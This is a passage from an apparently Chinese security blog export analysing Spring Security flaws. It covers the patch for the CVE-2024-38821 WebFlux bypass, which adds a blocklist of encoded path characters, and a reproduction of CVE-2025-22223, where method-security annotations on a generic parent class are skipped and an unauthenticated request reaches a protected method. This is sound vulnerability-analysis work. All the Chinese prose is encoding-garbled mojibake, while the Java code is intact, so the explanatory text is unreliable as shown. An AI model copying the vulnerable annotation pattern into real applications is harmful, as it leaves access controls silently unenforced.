<h2 id="æ¼æ´ä¿®å¤"><a href="#æ¼æ´ä¿®å¤" class="headerlink" title="æ¼æ´ä¿®å¤"></a>æ¼æ´ä¿®å¤</h2><p>é€šè¿‡å¯¹æ¯”<code>spring security</code> <code>v6.3.3</code>ä»¥åŠ<code>v6.3.4</code>æŸ¥çœ‹è¯¥æ¼æ´çš„ä¿®å¤æªæ–½ <a href="https://github.com/spring-projects/spring-security/compare/6.3.3...6.3.4">diffé“¾æ¥</a><br>å…³é”®çš„ä¿®å¤åœ¨<code>WebFilterChainProxy</code>ç±»ä¸­<br>é€šè¿‡æ–°çš„ç±»<code>StrictServerWebExchangeFirewall</code>æ¥å¯¹è¯·æ±‚è·¯å¾„è¿›è¡Œè¿‡æ»¤ï¼Œå¹¶æŠ›å‡ºå¼‚å¸¸ï¼Œä»è€Œé˜»æ­¢è¯·æ±‚ç»§ç»­æ‰§è¡Œã€‚<br><img src="/archives/f65bb354/img_k.png" alt="img.png"><br><code>StrictServerWebExchangeFirewall</code> æ˜¯æ¼æ´ä¿®å¤ç‰ˆæœ¬æ–°åˆ›å»ºçš„ç±»ï¼Œå†…å®¹è¾ƒå¤šï¼Œè¿™é‡Œä¸åœ¨è´´å‡ºä»£ç <a href="https://github.com/spring-projects/spring-security/blob/bb2fd24cd91276eaad900f6971d20371446b062a/web/src/main/java/org/springframework/security/web/server/firewall/StrictServerWebExchangeFirewall.java#L4">StrictServerWebExchangeFirewall</a><br>åœ¨ä¸Šå›¾çš„ä¿®å¤æ–¹æ¡ˆä¸­è°ƒç”¨çš„æ˜¯<code>getFirewalledExchange</code>æ–¹æ³•ã€‚  </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line">	<span class="keyword">public</span> Mono&lt;ServerWebExchange&gt; <span class="title function_">getFirewalledExchange</span><span class="params">(ServerWebExchange exchange)</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> Mono.fromCallable(() -&gt; &#123;</span><br><span class="line">			<span class="type">ServerHttpRequest</span> <span class="variable">request</span> <span class="operator">=</span> exchange.getRequest();</span><br><span class="line">			rejectForbiddenHttpMethod(request);</span><br><span class="line">			rejectedBlocklistedUrls(request); <span class="comment">// å¯¹è¯·æ±‚è·¯å¾„è¿›è¡Œæ£€æŸ¥</span></span><br><span class="line">			rejectedUntrustedHosts(request);</span><br><span class="line">			<span class="keyword">if</span> (!isNormalized(request)) &#123;</span><br><span class="line">				<span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ServerExchangeRejectedException</span>(</span><br><span class="line">						<span class="string">&quot;The request was rejected because the URL was not normalized&quot;</span>);</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			exchange.getResponse().beforeCommit(() -&gt; Mono.fromRunnable(() -&gt; &#123;</span><br><span class="line">				<span class="type">ServerHttpResponse</span> <span class="variable">response</span> <span class="operator">=</span> exchange.getResponse();</span><br><span class="line">				<span class="type">HttpHeaders</span> <span class="variable">headers</span> <span class="operator">=</span> response.getHeaders();</span><br><span class="line">				<span class="keyword">for</span> (Map.Entry&lt;String, List&lt;String&gt;&gt; header : headers.entrySet()) &#123;</span><br><span class="line">					<span class="type">String</span> <span class="variable">headerName</span> <span class="operator">=</span> header.getKey();</span><br><span class="line">					List&lt;String&gt; headerValues = header.getValue();</span><br><span class="line">					<span class="keyword">for</span> (String headerValue : headerValues) &#123;</span><br><span class="line">						validateCrlf(headerName, headerValue);</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;));</span><br><span class="line">			<span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">StrictFirewallServerWebExchange</span>(exchange);</span><br><span class="line">		&#125;);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<p>å¯¹è¯·æ±‚è·¯å¾„çš„æ£€æŸ¥å‘ç”Ÿåœ¨ <code>rejectedBlocklistedUrls</code>æ–¹æ³•ä¸­  </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">rejectedBlocklistedUrls</span><span class="params">(ServerHttpRequest request)</span> &#123;</span><br><span class="line">		<span class="keyword">for</span> (String forbidden : <span class="built_in">this</span>.encodedUrlBlocklist) &#123;</span><br><span class="line">			<span class="keyword">if</span> (encodedUrlContains(request, forbidden)) &#123; <span class="comment">// æœªè¿›è¡Œurlè§£ç æ—¶çš„path</span></span><br><span class="line">				<span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ServerExchangeRejectedException</span>(</span><br><span class="line">						<span class="string">&quot;The request was rejected because the URL contained a potentially malicious String \&quot;&quot;</span></span><br><span class="line">								+ forbidden + <span class="string">&quot;\&quot;&quot;</span>);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">for</span> (String forbidden : <span class="built_in">this</span>.decodedUrlBlocklist) &#123;</span><br><span class="line">			<span class="keyword">if</span> (decodedUrlContains(request, forbidden)) &#123; <span class="comment">// è·å–çš„pathæ˜¯urlè§£ç åçš„path</span></span><br><span class="line">				<span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ServerExchangeRejectedException</span>(</span><br><span class="line">						<span class="string">&quot;The request was rejected because the URL contained a potentially malicious String \&quot;&quot;</span></span><br><span class="line">								+ forbidden + <span class="string">&quot;\&quot;&quot;</span>);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<p><code>rejectedBlocklistedUrls</code>æ–¹æ³•æœ€ç»ˆä¼šè°ƒç”¨åˆ°<code>valueContains</code><br>å…¶ä¸­<code>value</code>æ˜¯å®¢æˆ·ç«¯è¯·æ±‚çš„pathï¼Œ<code>container</code>æ˜¯é¢„å®šä¹‰çš„è§„åˆ™ã€‚å½“<code>value</code>æ˜¯<code>container</code>çš„å…ƒç´ æ—¶ï¼Œè¿”å›trueï¼Œåœ¨ä¸Šä¸€çº§æ–¹æ³•ä¸­å°†ä¼šæŠ›å‡ºå¼‚å¸¸ã€‚<br>ä»è€Œå®Œæˆå¯¹æ¼æ´çš„ä¿®å¤ã€‚  </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">valueContains</span><span class="params">(String value, String contains)</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> value != <span class="literal">null</span> &amp;&amp; value.contains(contains);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><code>container</code>çš„å€¼åœ¨<code>StrictServerWebExchangeFirewall</code>å®ä¾‹åŒ–çš„æ—¶å€™è¢«è®¾ç½®  </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">StrictServerWebExchangeFirewall</span><span class="params">()</span> &#123;</span><br><span class="line">		urlBlocklistsAddAll(FORBIDDEN_SEMICOLON);</span><br><span class="line">		urlBlocklistsAddAll(FORBIDDEN_FORWARDSLASH);</span><br><span class="line">		urlBlocklistsAddAll(FORBIDDEN_DOUBLE_FORWARDSLASH);</span><br><span class="line">		urlBlocklistsAddAll(FORBIDDEN_BACKSLASH);</span><br><span class="line">		urlBlocklistsAddAll(FORBIDDEN_NULL);</span><br><span class="line">		urlBlocklistsAddAll(FORBIDDEN_LF);</span><br><span class="line">		urlBlocklistsAddAll(FORBIDDEN_CR);</span><br><span class="line"></span><br><span class="line">		<span class="built_in">this</span>.encodedUrlBlocklist.add(ENCODED_PERCENT);</span><br><span class="line">		<span class="built_in">this</span>.encodedUrlBlocklist.addAll(FORBIDDEN_ENCODED_PERIOD);</span><br><span class="line">		<span class="built_in">this</span>.decodedUrlBlocklist.add(PERCENT);</span><br><span class="line">		<span class="built_in">this</span>.decodedUrlBlocklist.addAll(FORBIDDEN_LINE_SEPARATOR);</span><br><span class="line">		<span class="built_in">this</span>.decodedUrlBlocklist.addAll(FORBIDDEN_PARAGRAPH_SEPARATOR);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<p><code>FORBIDDEN_SEMICOLON</code>ç­‰æ—¶ä¸€äº›è¢«é¢„å®šä¹‰çš„å¸¸é‡</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">ENCODED_PERCENT</span> <span class="operator">=</span> <span class="string">&quot;%25&quot;</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">PERCENT</span> <span class="operator">=</span> <span class="string">&quot;%&quot;</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> List&lt;String&gt; FORBIDDEN_ENCODED_PERIOD = Collections</span><br><span class="line">		.unmodifiableList(Arrays.asList(<span class="string">&quot;%2e&quot;</span>, <span class="string">&quot;%2E&quot;</span>));</span><br><span class="line"></span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> List&lt;String&gt; FORBIDDEN_SEMICOLON = Collections</span><br><span class="line">		.unmodifiableList(Arrays.asList(<span class="string">&quot;;&quot;</span>, <span class="string">&quot;%3b&quot;</span>, <span class="string">&quot;%3B&quot;</span>));</span><br><span class="line"></span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> List&lt;String&gt; FORBIDDEN_FORWARDSLASH = Collections</span><br><span class="line">		.unmodifiableList(Arrays.asList(<span class="string">&quot;%2f&quot;</span>, <span class="string">&quot;%2F&quot;</span>));</span><br><span class="line"></span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> List&lt;String&gt; FORBIDDEN_DOUBLE_FORWARDSLASH = Collections</span><br><span class="line">		.unmodifiableList(Arrays.asList(<span class="string">&quot;//&quot;</span>, <span class="string">&quot;%2f%2f&quot;</span>, <span class="string">&quot;%2f%2F&quot;</span>, <span class="string">&quot;%2F%2f&quot;</span>, <span class="string">&quot;%2F%2F&quot;</span>));</span><br><span class="line"></span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> List&lt;String&gt; FORBIDDEN_BACKSLASH = Collections</span><br><span class="line">		.unmodifiableList(Arrays.asList(<span class="string">&quot;\\&quot;</span>, <span class="string">&quot;%5c&quot;</span>, <span class="string">&quot;%5C&quot;</span>));</span><br><span class="line"></span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> List&lt;String&gt; FORBIDDEN_NULL = Collections.unmodifiableList(Arrays.asList(<span class="string">&quot;\0&quot;</span>, <span class="string">&quot;%00&quot;</span>));</span><br><span class="line"></span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> List&lt;String&gt; FORBIDDEN_LF = Collections.unmodifiableList(Arrays.asList(<span class="string">&quot;\n&quot;</span>, <span class="string">&quot;%0a&quot;</span>, <span class="string">&quot;%0A&quot;</span>));</span><br><span class="line"></span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> List&lt;String&gt; FORBIDDEN_CR = Collections.unmodifiableList(Arrays.asList(<span class="string">&quot;\r&quot;</span>, <span class="string">&quot;%0d&quot;</span>, <span class="string">&quot;%0D&quot;</span>));</span><br><span class="line"></span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> List&lt;String&gt; FORBIDDEN_LINE_SEPARATOR = Collections.unmodifiableList(Arrays.asList(<span class="string">&quot;\u2028&quot;</span>));</span><br><span class="line"></span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> List&lt;String&gt; FORBIDDEN_PARAGRAPH_SEPARATOR = Collections</span><br><span class="line">		.unmodifiableList(Arrays.asList(<span class="string">&quot;\u2029&quot;</span>));</span><br></pre></td></tr></table></figure>
<p><code>FORBIDDEN_DOUBLE_FORWARDSLASH</code>å°±æ˜¯æˆ‘ä»¬ä½¿ç”¨çš„<code>//</code></p>
<h2 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h2><ul>
<li><a href="https://github.com/spring-projects/spring-security/compare/6.3.3...6.3.4">ä»£ç diff</a></li>
<li><a href="https://spring.io/security/cve-2024-38821">Authorization Bypass of Static Resources in WebFlux Applications</a></li>
</ul>
]]></content>
      <categories>
        <category>æ¼æ´åˆ†æ</category>
      </categories>
      <tags>
        <tag>æ¼æ´åˆ†æ</tag>
        <tag>è®¤è¯ç»•è¿‡</tag>
        <tag>Spring Security</tag>
        <tag>WebFlux</tag>
        <tag>CVE-2024-38821</tag>
      </tags>
  </entry>
  <entry>
    <title>Spring-Security-EnableMethodSecurityæ³¨è§£æˆæƒç»•è¿‡ï¼ˆCVE-2025-22223ï¼‰</title>
    <url>/archives/93b95985.html</url>
    <content><![CDATA[<h1 id="Spring-Security-EnableMethodSecurityæ³¨è§£æˆæƒç»•è¿‡ï¼ˆCVE-2025-22223ï¼‰"><a href="#Spring-Security-EnableMethodSecurityæ³¨è§£æˆæƒç»•è¿‡ï¼ˆCVE-2025-22223ï¼‰" class="headerlink" title="Spring-Security-EnableMethodSecurityæ³¨è§£æˆæƒç»•è¿‡ï¼ˆCVE-2025-22223ï¼‰"></a>Spring-Security-EnableMethodSecurityæ³¨è§£æˆæƒç»•è¿‡ï¼ˆCVE-2025-22223ï¼‰</h1><h2 id="æ¼æ´æè¿°"><a href="#æ¼æ´æè¿°" class="headerlink" title="æ¼æ´æè¿°"></a>æ¼æ´æè¿°</h2><p><img src="/archives/93b95985/img.png" alt="img.png"><br>è¯¥æ¼æ´å½±å“ Spring Security 6.4.0 - 6.4.3 ç‰ˆæœ¬ï¼Œå†6.4.4 ç‰ˆæœ¬åšäº†ä¿®å¤  </p>
<h2 id="æ¼æ´æ¼”ç¤º"><a href="#æ¼æ´æ¼”ç¤º" class="headerlink" title="æ¼æ´æ¼”ç¤º"></a>æ¼æ´æ¼”ç¤º</h2><p>é€šè¿‡æ¼æ´æè¿°æˆ‘ä»¬çŸ¥é“è¯¥æ¼æ´çš„è§¦å‘éœ€è¦ä½¿ç”¨ <code>EnableMethodSecurity</code> æ³¨è§£ï¼Œå¹¶ä¸”åœ¨æ³›å‹çˆ¶ç±»ï¼Œæ¥å£ï¼Œé‡å†™æ–¹æ³•ä¸Šä½¿ç”¨äº†æ–¹æ³•å®‰å…¨æ³¨è§£ï¼Œ<br>å¦‚ï¼š<code>@PreAuthorize(&quot;hasRole(&#39;ADMIN&#39;)&quot;) @Secured(&quot;ROLE_ADMIN&quot;) @PreFilter(&quot;filterObject.owner == authentication.name&quot;) @PostFilter(&quot;filterObject.owner == authentication.name&quot;)</code> ç­‰<br>é¦–å…ˆæˆ‘ä»¬éœ€è¦æ„é€ ä¸€ä¸ª<code>spring Security</code>çš„é¡¹ç›® è¿™é‡Œä½¿ç”¨<code>spring boot</code>æ„é€ <br><code>spring-boot-starter-parent </code>ç‰ˆæœ¬ä¸º <code>3.4.3 </code> è¯¥ç‰ˆæœ¬ä½¿ç”¨çš„<code>spring security </code>ç‰ˆæœ¬ä¸º <code>6.4.3</code> åˆšå¥½ç¬¦åˆè¦æ±‚<br>åˆ›å»º<code>spring boot</code>å…¥å£ç±»  </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.demo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.SpringApplication;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.autoconfigure.SpringBootApplication;</span><br><span class="line"></span><br><span class="line"><span class="meta">@SpringBootApplication</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DemoApplication</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        SpringApplication.run(DemoApplication.class, args);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>åˆ›å»º spring web é…ç½®ç±»  </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.demo.config;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Bean;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Configuration;</span><br><span class="line"><span class="keyword">import</span> org.springframework.security.config.annotation.web.builders.HttpSecurity;</span><br><span class="line"><span class="keyword">import</span> org.springframework.security.config.annotation.web.configuration.EnableWebSecurity;</span><br><span class="line"><span class="keyword">import</span> org.springframework.security.web.SecurityFilterChain;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="meta">@EnableWebSecurity</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">WebSecurityConfig</span> &#123;</span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> SecurityFilterChain <span class="title function_">filterChain</span><span class="params">(HttpSecurity http)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        http</span><br><span class="line">                .authorizeHttpRequests(authorize -&gt; authorize</span><br><span class="line">                        .requestMatchers(<span class="string">&quot;/test&quot;</span>).permitAll()</span><br><span class="line">                        .anyRequest().authenticated()</span><br><span class="line">                );</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> http.build();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>åˆ›å»º æ–¹æ³•å®‰å…¨é…ç½®ç±»  </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.demo.config;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Configuration;</span><br><span class="line"><span class="keyword">import</span> org.springframework.security.config.annotation.method.configuration.EnableMethodSecurity;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="meta">@EnableMethodSecurity(</span></span><br><span class="line"><span class="meta">        prePostEnabled = true, // å¯ç”¨ @PreAuthorize, @PostAuthorize ç­‰æ³¨è§£</span></span><br><span class="line"><span class="meta">        securedEnabled = true, // å¯ç”¨ @Secured æ³¨è§£</span></span><br><span class="line"><span class="meta">        jsr250Enabled = true   // å¯ç”¨ @RolesAllowed, @PermitAll, @DenyAll æ³¨è§£</span></span><br><span class="line"><span class="meta">)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MethodSecurityConfig</span>  &#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>åˆ›å»ºæ–¹æ³•æˆæƒæ§åˆ¶æœåŠ¡åŸºç±»<br>åœ¨è¯¥åŸºç±»ä¸­å®šä¹‰äº†æŠ½è±¡æ–¹æ³• <code>securedMethod</code> è¯¥æ–¹æ³•å°†è¢«å­ç±»ç»§æ‰¿å®ç°ï¼Œå¹¶ä½¿ç”¨ <code>@Secured</code> æ³¨è§£è¿›è¡Œæ–¹æ³•å®‰å…¨æ§åˆ¶<br>åªæœ‰å…·æœ‰<code>ROLE_USER</code> æˆ– <code>ROLE_ADMIN</code> è§’è‰²çš„ç”¨æˆ·å¯ä»¥è®¿é—®è¯¥æ–¹æ³•  </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.demo.service;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.security.access.annotation.Secured;</span><br><span class="line"></span><br><span class="line"><span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">SecureServiceParent</span>&lt;T&gt; &#123;</span><br><span class="line">    <span class="meta">@Secured(&#123;&quot;ROLE_USER&quot;, &quot;ROLE_ADMIN&quot;&#125;)</span></span><br><span class="line">    <span class="keyword">abstract</span> T  <span class="title function_">securedMethod</span><span class="params">(T t)</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>åˆ›å»ºå­ç±»ï¼Œå­ç±»å®ç°çˆ¶ç±»æ–¹æ³• <code>securedMethod</code>  </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.demo.service;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Service;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Service</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SecureService</span> <span class="keyword">extends</span> <span class="title class_">SecureServiceParent</span>&lt;String&gt; &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">securedMethod</span><span class="params">(String s)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;This method is accessible by users and admins&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>åˆ›å»ºæµ‹è¯•æ§åˆ¶å™¨<br>æµ‹è¯•æ§åˆ¶å™¨æ–¹æ³• <code>test</code> è°ƒç”¨äº†å®‰å…¨æœåŠ¡çš„ <code>securedMethod</code> æ–¹æ³•<br>ä¸€èˆ¬æ¥è®²å› ä¸º <code>@EnableMethodSecurity</code> æ³¨è§£çš„é…ç½®ï¼Œæ‰€ä»¥ <code>@Secured</code> æ³¨è§£çš„æ–¹æ³•åœ¨æœªç™»å½•çš„æƒ…å†µä¸‹æ— æ³•è®¿é—®ï¼Œå³æ­¤æ—¶è®¿é—®<code>/test</code>æ¥å£ä¼šå“åº”ä¸€ä¸ªè®¿é—®è¢«æ‹’ç»çš„å“åº”  </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.demo.controller;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.example.demo.service.SecureService;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"><span class="keyword">import</span> org.springframework.http.ResponseEntity;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.GetMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestController</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> SecureService secureService;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping(&quot;/test&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> ResponseEntity&lt;String&gt; <span class="title function_">test</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">message</span> <span class="operator">=</span> secureService.securedMethod(<span class="string">&quot;test&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> ResponseEntity.ok(message);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>å°†æˆ‘ä»¬çš„ç¨‹åºè·‘èµ·æ¥å¹¶è®¿é—®<code>http://127.0.0.1:8080/test</code><br><img src="/archives/93b95985/img_1.png" alt="img_1.png"><br>å¦‚ä¸Šå›¾ï¼Œæˆ‘ä»¬è®¿é—®<code>/test</code>æ¥å£æ—¶å¹¶æ²¡æœ‰ç™»å½• <code>securedMethod</code> æ–¹æ³•å´æˆåŠŸæ‰§è¡Œäº†ã€‚<br>è¿™è¯æ˜å½“å­˜åœ¨æ³›å‹æ—¶<code>spring security</code>å¹¶ä¸èƒ½æœ‰æ•ˆçš„å°†å­ç±»ä¸çˆ¶ç±»çš„<code>securedMethod</code>æ–¹æ³•è¯†åˆ«ä¸ºåŒä¸€ä¸ªï¼Œ<br>æ•…æ­¤æ—¶åœ¨åŒ…å«äº†æ³›å‹å‚æ•°çš„çˆ¶ç±»æ–¹æ³•ä¸­ä½¿ç”¨çš„<code>@Secured</code>ç­‰æ³¨è§£è¿›è¡Œæ€§çš„è®¿é—®æ§åˆ¶å¹¶ä¸èƒ½ç”Ÿæ•ˆã€‚<br>ä¸ºäº†è¿›è¡Œå¯¹æ¯”å¯ä»¥ä¿®æ”¹ <code>securedMethod</code>æ–¹æ³•çš„ç­¾åå–æ¶ˆæ‰æ³›å‹ä¿¡æ¯å†æ¬¡å¯¹<code>/test</code>æ¥å£è¿›è¡Œè®¿é—®ï¼Œæ­¤æ—¶é¡µé¢ä¼šè¢«é‡å®šå‘åˆ°ç™»å½•é¡µé¢ã€‚    </p>
<h2 id="æ¼æ´åŸç†"><a href="#æ¼æ´åŸç†" class="headerlink" title="æ¼æ´åŸç†"></a>æ¼æ´åŸç†</h2><p>æˆ‘ä»¬çŸ¥é“æ¼æ´æ”¯æŒçš„æœ€é«˜ç‰ˆæœ¬ä¸º6.4.3 æ‰€ä»¥æˆ‘ä»¬å°†6.4.3ç‰ˆæœ¬ä¸6.4.4ç‰ˆæœ¬è¿›è¡Œå¯¹æ¯”<a href="https://github.com/spring-projects/spring-security/compare/6.4.3...6.4.4">å‚è€ƒæ¯”è¾ƒé“¾æ¥</a>ï¼Œ<br>ä»è€Œå‘ç°åœ¨<code>core/src/main/java/org/springframework/security/core/annotation/UniqueSecurityAnnotationScanner.java</code> ç±»ä¸­å‡ºç°äº†å…³é”®æ›´æ”¹<br><img src="/archives/93b95985/img_2.png" alt="img_2.png"><br>åœ¨ä¸Šå›¾çš„ä»£ç ä¸­ï¼Œé¦–å…ˆé€šè¿‡åå°„è°ƒç”¨<code>targetClass</code>çš„<code>getDeclaredMethod</code>ä»¥è·å–å½“å‰ç±»çš„æŸä¸€ä¸ªæ–¹æ³•å¾—åˆ°ä¸€ä¸ª<code>Method</code>å¯¹è±¡ï¼Œç„¶åé€šè¿‡<code>findDirectAnnotations</code>æ–¹æ³•è·å–åˆ°è¯¥æ–¹æ³•çš„æ‰€æœ‰æ³¨è§£ã€‚<br><code>getDeclaredMethod</code> æ–¹æ³•è·å–çš„æ–¹æ³•åå¹¶ä¸èƒ½è·å–åˆ°çˆ¶ç±»çš„æ–¹æ³•ï¼Œå½“å­˜åœ¨é‡å†™æ–¹æ³•æ—¶è¯¥æ–¹æ³•è·å–åˆ°çš„<code>Method</code>å¯¹è±¡åªåŒ…æ‹¬å½“å‰ç±»å£°æ˜çš„æ–¹æ³•<br><code>findDirectAnnotations</code> æ–¹æ³•æœç´¢æ³¨è§£çš„ç­–ç•¥æ˜¯<code>MergedAnnotations.SearchStrategy.DIRECT</code> å³åªæœç´¢ç›´æ¥å£°æ˜åœ¨ç›®æ ‡å…ƒç´ ä¸Šçš„æ³¨è§£ï¼Œä¸åŒ…æ‹¬ç»§æ‰¿çš„æ³¨è§£ï¼Œæ‰€ä»¥æ­¤æ—¶ä¹Ÿè·å–ä¸åˆ°çˆ¶ç±»æ–¹æ³•çš„æ³¨è§£ã€‚  </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> List&lt;MergedAnnotation&lt;A&gt;&gt; <span class="title function_">findDirectAnnotations</span><span class="params">(AnnotatedElement element)</span> &#123;</span><br><span class="line">		<span class="type">MergedAnnotations</span> <span class="variable">mergedAnnotations</span> <span class="operator">=</span> MergedAnnotations.from(element, MergedAnnotations.SearchStrategy.DIRECT,</span><br><span class="line">				RepeatableContainers.none());</span><br><span class="line">		<span class="keyword">return</span> mergedAnnotations.stream()</span><br><span class="line">			.filter((annotation) -&gt; <span class="built_in">this</span>.types.contains(annotation.getType()))</span><br><span class="line">			.map((annotation) -&gt; (MergedAnnotation&lt;A&gt;) annotation)</span><br><span class="line">			.toList();</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<p>è¿™æ ·å°±äº§ç”Ÿäº†æ¼æ´<br>åœ¨å®é™…æµ‹è¯•çš„æ—¶å€™å‘ç°åªæ˜¯å•çº¯çš„åœ¨çˆ¶ç±»æ–¹æ³•ä¸­å£°æ˜æ–¹æ³•å®‰å…¨æ³¨è§£è€Œä¸åœ¨å­ç±»ä¸­å£°æ˜å¹¶ä¸ä¼šå¯¼è‡´æ¼æ´ï¼Œåªæœ‰åœ¨çˆ¶ç±»æ–¹æ³•åŒ…å«æ³›å‹çš„æ—¶å€™æ‰ä¼šå¯¼è‡´æ¼æ´ï¼Œ<br>é‚£ä¹ˆè¯æ˜è¿™ä¸ªæ¼æ´é€»è¾‘è¿˜ä¸å¤Ÿå®Œæ•´ï¼Œæˆ‘ä»¬çœ‹<code>findClosestMethodAnnotations</code>æ–¹æ³•ä¸­ä¸‹é¢çš„ä»£ç   </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">List&lt;MergedAnnotation&lt;A&gt;&gt; annotations = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;(</span><br><span class="line">				findClosestMethodAnnotations(method, targetClass.getSuperclass(), classesToSkip));</span><br></pre></td></tr></table></figure>
